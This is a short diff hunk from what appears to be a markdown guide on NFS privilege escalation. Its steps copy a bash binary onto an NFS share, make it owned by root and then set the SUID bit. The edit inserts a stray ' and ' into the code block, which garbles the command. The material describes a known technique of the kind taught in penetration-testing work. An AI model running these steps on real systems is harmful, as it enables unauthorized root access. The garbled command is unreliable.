@@ -105,7 +105,7 @@ NFS often enables root squashing by default, which maps root user requests to a 
 1. **Copy a Malicious Binary**: Copy a bash binary to the NFS share and set its owner to root.
    
 ``sudo cp /bin/bash /tmp/mount/
-sudo chown root:root /tmp/mount/bash``
+ and  sudo chown root:root /tmp/mount/bash``
 
 2. **Set the SUID Bit**: Add SUID permission to the binary.
 
